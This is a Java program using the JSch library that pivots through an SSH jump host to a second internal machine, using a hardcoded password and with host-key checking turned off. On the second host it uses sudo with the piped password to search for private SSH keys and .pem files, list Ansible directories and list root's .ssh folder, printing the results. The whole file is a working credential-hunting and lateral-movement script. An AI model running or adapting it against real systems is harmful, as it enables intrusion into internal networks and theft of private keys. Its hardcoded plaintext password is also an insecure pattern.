import com.jcraft.jsch.*;
import java.io.*;
class SSHI {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session jump = j.getSession("user", "10.14.36.23", 22);
    jump.setPassword("kutul0nc4t");
    jump.setConfig(p);
    jump.setTimeout(10000);
    jump.connect();
    int fwd = jump.setPortForwardingL(0, "10.14.16.10", 22);
    Session ts = j.getSession("user", "127.0.0.1", fwd);
    ts.setPassword("kutul0nc4t");
    ts.setConfig(p);
    ts.setTimeout(8000);
    ts.connect();
    ChannelExec ch = (ChannelExec) ts.openChannel("exec");
    ch.setCommand("hostname;id;echo ---SSH-KEYS---;echo kutul0nc4t | sudo -S find / -maxdepth 4 -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' 2>/dev/null;echo ---ANSIBLE---;ls /etc/ansible/ 2>/dev/null;ls /home/*/ansible/ 2>/dev/null;echo ---ROOT-SSH---;echo kutul0nc4t | sudo -S ls -la /root/.ssh/ 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    ts.disconnect();
    jump.disconnect();
  }
}
